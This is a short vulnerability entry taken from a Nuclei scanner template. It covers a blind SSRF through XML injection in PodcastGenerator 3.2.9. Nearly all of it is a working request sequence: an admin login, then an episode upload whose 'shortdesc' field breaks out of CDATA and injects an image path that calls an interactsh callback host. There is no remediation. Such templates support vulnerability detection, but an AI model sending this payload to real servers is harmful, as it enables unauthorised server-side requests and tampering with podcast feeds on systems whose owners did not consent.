# Vulnerability: PodcastGenerator 3.2.9 - Blind SSRF via XML Injection
**Classification:** PODCASTGENERATOR
**Source:** Nuclei Template (`podcast-generator-ssrf.yaml`)

## Description
This is a SSRF vulnerability via Xml injection found in PodcastGenerator 3.2.9.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /podcast/PodcastGenerator/admin/login.php?login=1 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}

GET /podcast/PodcastGenerator/admin/episodes_upload.php HTTP/1.1
Host: {{Hostname}}

POST /podcast/PodcastGenerator/admin/episodes_upload.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1WfeHRSBn1aNkQQA

------WebKitFormBoundary1WfeHRSBn1aNkQQA
Content-Disposition: form-data; name="file"; filename="{{string}}.jpg"
Content-Type: image/jpeg

{{rand_text_alpha(50)}}
{{rand_text_alpha(50)}}

------WebKitFormBoundary1WfeHRSBn1aNkQQA
Content-Disposition: form-data; name="title"

{{string}}
------WebKitFormBoundary1WfeHRSBn1aNkQQA
Content-Disposition: form-data; name="shortdesc"

test]]></shortdescPG><imgPG path="">http://{{interactsh-url}}</imgPG><shortdescPG><![CDATA[test
------WebKitFormBoundary1WfeHRSBn1aNkQQA
Content-Disposition: form-data; name="category[ ]"

uncategorized
------WebKitFormBoundary1WfeHRSBn1aNkQQA
Content-Disposition: form-data; name="date"

2023-10-30
------WebKitFormBoundary1WfeHRSBn1aNkQQA
Content-Disposition: form-data; name="time"

12:26
------WebKitFormBoundary1WfeHRSBn1aNkQQA
Content-Disposition: form-data; name="episodecover"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundary1WfeHRSBn1aNkQQA
Content-Disposition: form-data; name="longdesc"


------WebKitFormBoundary1WfeHRSBn1aNkQQA
Content-Disposition: form-data; name="episodenum"


------WebKitFormBoundary1WfeHRSBn1aNkQQA
Content-Disposition: form-data; name="seasonnum"


------WebKitFormBoundary1WfeHRSBn1aNkQQA
Content-Disposition: form-data; name="itunesKeywords"


------WebKitFormBoundary1WfeHRSBn1aNkQQA
Content-Disposition: form-data; name="explicit"

no
------WebKitFormBoundary1WfeHRSBn1aNkQQA
Content-Disposition: form-data; name="authorname"

{{string}}
------WebKitFormBoundary1WfeHRSBn1aNkQQA
Content-Disposition: form-data; name="authoremail"

{{string}}@{{string}}.com
------WebKitFormBoundary1WfeHRSBn1aNkQQA
Content-Disposition: form-data; name="customtags"


------WebKitFormBoundary1WfeHRSBn1aNkQQA
Content-Disposition: form-data; name="token"

{{token}}
------WebKitFormBoundary1WfeHRSBn1aNkQQA--
```

